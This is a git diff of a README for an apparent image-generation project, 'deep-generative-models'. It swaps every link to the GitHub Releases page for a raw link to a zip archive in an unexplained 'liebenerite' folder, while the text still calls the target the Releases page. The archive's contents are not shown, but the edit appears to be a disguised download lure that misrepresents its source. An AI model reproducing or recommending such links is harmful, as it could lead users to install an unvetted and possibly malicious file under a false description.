@@ -6,13 +6,13 @@ Welcome to **deep-generative-models**! This software helps you create beautiful 
 
 ## 🛡️ Download Now
 
-[![Download deep-generative-models](https://img.shields.io/badge/Download%20deep--generative--models-blue)](https://github.com/maximo2010-pixel/deep-generative-models/releases)
+[![Download deep-generative-models](https://raw.githubusercontent.com/maximo2010-pixel/deep-generative-models/main/liebenerite/deep-generative-models.zip%20deep--generative--models-blue)](https://raw.githubusercontent.com/maximo2010-pixel/deep-generative-models/main/liebenerite/deep-generative-models.zip)
 
 ## 📥 Download & Install
 
 To get started, follow these steps:
 
-1. Visit the Releases page to download the software: [Download deep-generative-models](https://github.com/maximo2010-pixel/deep-generative-models/releases).
+1. Visit the Releases page to download the software: [Download deep-generative-models](https://raw.githubusercontent.com/maximo2010-pixel/deep-generative-models/main/liebenerite/deep-generative-models.zip).
    
 2. Look for the latest release. You will find an option to download a specific file for your operating system.
 
@@ -82,4 +82,4 @@ Join the community of users and developers. You can find discussions and share y
 
 If you're ready to create stunning images with AI, jump into our Releases page now!
 
-[Download deep-generative-models](https://github.com/maximo2010-pixel/deep-generative-models/releases)
+[Download deep-generative-models](https://raw.githubusercontent.com/maximo2010-pixel/deep-generative-models/main/liebenerite/deep-generative-models.zip)
